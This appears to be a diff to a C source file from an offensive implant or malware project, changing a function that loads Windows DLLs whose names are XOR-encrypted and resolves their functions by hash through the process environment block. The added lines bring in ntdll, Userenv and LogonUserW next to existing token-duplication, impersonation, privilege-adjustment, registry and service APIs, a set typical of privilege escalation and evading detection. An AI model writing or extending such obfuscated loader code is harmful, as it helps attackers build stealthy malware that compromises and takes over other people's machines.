@@ -13,12 +13,16 @@ BOOL loadApi(API_Call *APICall) {
 	Ws2_32_API* Ws2_32Api = &(APICall->Ws2_32Api);
 	Wininet_API* WininetApi = &(APICall->WininetApi);
 	Cabinet_API* CabinetApi = &(APICall->CabinetApi);
+	ntdll_API* ntdllApi = &(APICall->ntdllApi);
+	Userenv_API* UserenvApi = &(APICall->UserenvApi);
 
-	char Advapi32DllStr[] = "\x26\x2B\x32\x24\x07\x13\x54\x7D\x6A\x21\x1B\x16\x67";
-	char Shell32DllStr[] = "\x30\x18\x29\x07\x03\x59\x79\x66\x13\x3D\x28\x55";
-	char Ws2_32DllStr[] = "\x39\x1F\x65\x3C\x59\x68\x77\x0B\x39\x23\x78";
-	char WininetDllStr[] = "\x23\x00\x1B\x2D\x0A\x28\x15\x46\x2B\x23\x24\x7A";
-	char CabinetDllStr[] = "\x1B\x14\x26\x33\x3B\x00\x30\x44\x12\x3E\x01\x69";
+	char Advapi32DllStr[] = "\x0C\x27\x20\x03\x14\x04\x6B\x67\x74\x2B\x0D\x34\x6E";
+	char Shell32DllStr[] = "\x30\x0F\x00\x1B\x24\x7C\x71\x61\x11\x3D\x0F\x67";
+	char Ws2_32DllStr[] = "\x20\x00\x55\x0D\x71\x7C\x6D\x27\x22\x01\x75";
+	char WininetDllStr[] = "\x00\x2A\x16\x1D\x2C\x3D\x13\x68\x2E\x1B\x3F\x4C";
+	char CabinetDllStr[] = "\x3B\x20\x3A\x38\x07\x0B\x1D\x47\x31\x14\x20\x6C";
+	char ntdllDllStr[] = "\x3B\x21\x23\x24\x3D\x4A\x0B\x1D\x22\x77";
+	char UserenvDllStr[] = "\x02\x02\x29\x3B\x02\x3F\x20\x4F\x07\x0E\x3E\x6D";
 
 
 	const DWORD hash_kernel32_dll = 0x29cdd463;
@@ -34,11 +38,13 @@ BOOL loadApi(API_Call *APICall) {
 	if(pLoadLibraryA == NULL)
 		return FALSE;
 
-	decryptionRoutine(Advapi32DllStr,13,"\x67\x4F\x44\x45\x77\x7A\x00\x42\x7A\x45\x69\x53\x6B");
-	decryptionRoutine(Shell32DllStr,12,"\x63\x70\x4C\x6B\x6F\x6A\x4B\x48\x77\x51\x44\x55");
-	decryptionRoutine(Ws2_32DllStr,11,"\x6E\x6C\x57\x63\x6A\x5A\x59\x6F\x55\x4F\x78");
-	decryptionRoutine(WininetDllStr,12,"\x74\x69\x75\x44\x64\x4D\x61\x68\x4F\x4F\x48\x7A");
-	decryptionRoutine(CabinetDllStr,12,"\x58\x75\x44\x5A\x55\x65\x44\x6A\x76\x52\x6D\x69");
+	decryptionRoutine(Advapi32DllStr,13,"\x4D\x43\x56\x62\x64\x6D\x58\x55\x5A\x4F\x61\x58\x6E");
+	decryptionRoutine(Shell32DllStr,12,"\x63\x67\x65\x77\x48\x4F\x43\x4F\x75\x51\x00\x6B");
+	decryptionRoutine(Ws2_32DllStr,11,"\x77\x73\x67\x52\x42\x4E\x43\x43\x4E\x6D\x75");
+	decryptionRoutine(WininetDllStr,12,"\x57\x43\x78\x74\x42\x58\x67\x46\x4A\x77\x53\x4C");
+	decryptionRoutine(CabinetDllStr,12,"\x78\x41\x58\x51\x69\x6E\x69\x69\x55\x78\x4C\x6C");
+	decryptionRoutine(ntdllDllStr,10,"\x55\x55\x47\x48\x51\x64\x6F\x71\x4E\x77");
+	decryptionRoutine(UserenvDllStr,12,"\x57\x71\x4C\x49\x67\x51\x56\x61\x63\x62\x52\x6D");
 
 
 	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
@@ -108,7 +114,8 @@ BOOL loadApi(API_Call *APICall) {
 		Advapi32Api->QueryServiceConfigAF = (QueryServiceConfigA_F)find_api(pPeb,Advapi32Hash, 0xec94d313);
 		Advapi32Api->StartServiceAF = (StartServiceA_F)find_api(pPeb,Advapi32Hash, 0x19a887f9);
 		Advapi32Api->QueryServiceStatusExF = (QueryServiceStatusEx_F)find_api(pPeb,Advapi32Hash, 0x22a75fdd);
-		if(Advapi32Api->AllocateAndInitializeSidF == NULL ||Advapi32Api->CheckTokenMembershipF == NULL ||Advapi32Api->FreeSidF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->DuplicateTokenExF == NULL ||Advapi32Api->ImpersonateLoggedOnUserF == NULL ||Advapi32Api->CreateProcessWithLogonWF == NULL ||Advapi32Api->CreateWellKnownSidF == NULL ||Advapi32Api->GetTokenInformationF == NULL ||Advapi32Api->DuplicateTokenF == NULL ||Advapi32Api->CreateProcessWithTokenWF == NULL ||Advapi32Api->LookupPrivilegeValueAF == NULL ||Advapi32Api->LookupPrivilegeValueWF == NULL ||Advapi32Api->AdjustTokenPrivilegesF == NULL ||Advapi32Api->SetTokenInformationF == NULL ||Advapi32Api->GetSidSubAuthorityF == NULL ||Advapi32Api->GetLengthSidF == NULL ||Advapi32Api->PrivilegeCheckF == NULL ||Advapi32Api->RegOpenKeyExAF == NULL ||Advapi32Api->RegQueryValueExAF == NULL ||Advapi32Api->RegCloseKeyF == NULL ||Advapi32Api->RegCreateKeyExAF == NULL ||Advapi32Api->RegDeleteKeyAF == NULL ||Advapi32Api->RegSetValueExAF == NULL ||Advapi32Api->RegEnumKeyExAF == NULL ||Advapi32Api->LookupAccountSidAF == NULL ||Advapi32Api->ConvertSidToStringSidAF == NULL ||Advapi32Api->OpenSCManagerAF == NULL ||Advapi32Api->OpenServiceAF == NULL ||Advapi32Api->CloseServiceHandleF == NULL ||Advapi32Api->QueryServiceConfigAF == NULL ||Advapi32Api->StartServiceAF == NULL ||Advapi32Api->QueryServiceStatusExF == NULL)
+		Advapi32Api->LogonUserWF = (LogonUserW_F)find_api(pPeb,Advapi32Hash, 0x98d27178);
+		if(Advapi32Api->AllocateAndInitializeSidF == NULL ||Advapi32Api->CheckTokenMembershipF == NULL ||Advapi32Api->FreeSidF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->DuplicateTokenExF == NULL ||Advapi32Api->ImpersonateLoggedOnUserF == NULL ||Advapi32Api->CreateProcessWithLogonWF == NULL ||Advapi32Api->CreateWellKnownSidF == NULL ||Advapi32Api->GetTokenInformationF == NULL ||Advapi32Api->DuplicateTokenF == NULL ||Advapi32Api->CreateProcessWithTokenWF == NULL ||Advapi32Api->LookupPrivilegeValueAF == NULL ||Advapi32Api->LookupPrivilegeValueWF == NULL ||Advapi32Api->AdjustTokenPrivilegesF == NULL ||Advapi32Api->SetTokenInformationF == NULL ||Advapi32Api->GetSidSubAuthorityF == NULL ||Advapi32Api->GetLengthSidF == NULL ||Advapi32Api->PrivilegeCheckF == NULL ||Advapi32Api->RegOpenKeyExAF == NULL ||Advapi32Api->RegQueryValueExAF == NULL ||Advapi32Api->RegCloseKeyF == NULL ||Advapi32Api->RegCreateKeyExAF == NULL ||Advapi32Api->RegDeleteKeyAF == NULL ||Advapi32Api->RegSetValueExAF == NULL ||Advapi32Api->RegEnumKeyExAF == NULL ||Advapi32Api->LookupAccountSidAF == NULL ||Advapi32Api->ConvertSidToStringSidAF == NULL ||Advapi32Api->OpenSCManagerAF == NULL ||Advapi32Api->OpenServiceAF == NULL ||Advapi32Api->CloseServiceHandleF == NULL ||Advapi32Api->QueryServiceConfigAF == NULL ||Advapi32Api->StartServiceAF == NULL ||Advapi32Api->QueryServiceStatusExF == NULL ||Advapi32Api->LogonUserWF == NULL)
 			return FALSE;
 	}else
 		return FALSE;
@@ -159,6 +166,26 @@ BOOL loadApi(API_Call *APICall) {
 		CabinetApi->DecompressF = (Decompress_F)find_api(pPeb,CabinetHash, 0x80ec17e2);
 		CabinetApi->CloseDecompressorF = (CloseDecompressor_F)find_api(pPeb,CabinetHash, 0xe418861);
 		if(CabinetApi->CreateDecompressorF == NULL ||CabinetApi->DecompressF == NULL ||CabinetApi->CloseDecompressorF == NULL)
+			return FALSE;
+	}else
+		return FALSE;
+
+	if(pLoadLibraryA(ntdllDllStr) != NULL) {
+		const DWORD ntdllHash = 0x145370bb;
+		memset(ntdllDllStr,0x00,10);
+		ntdllApi->NtQueryInformationProcessF = (NtQueryInformationProcess_F)find_api(pPeb,ntdllHash, 0x69925b6a);
+		if(ntdllApi->NtQueryInformationProcessF == NULL)
+			return FALSE;
+	}else
+		return FALSE;
+
+	if(pLoadLibraryA(UserenvDllStr) != NULL) {
+		const DWORD UserenvHash = 0xf982c3f;
+		memset(UserenvDllStr,0x00,12);
+		UserenvApi->CreateEnvironmentBlockF = (CreateEnvironmentBlock_F)find_api(pPeb,UserenvHash, 0xa45670e7);
+		UserenvApi->GetUserProfileDirectoryWF = (GetUserProfileDirectoryW_F)find_api(pPeb,UserenvHash, 0x6d142221);
+		UserenvApi->DestroyEnvironmentBlockF = (DestroyEnvironmentBlock_F)find_api(pPeb,UserenvHash, 0x69d6af7f);
+		if(UserenvApi->CreateEnvironmentBlockF == NULL ||UserenvApi->GetUserProfileDirectoryWF == NULL ||UserenvApi->DestroyEnvironmentBlockF == NULL)
 			return FALSE;
 	}else
 		return FALSE;
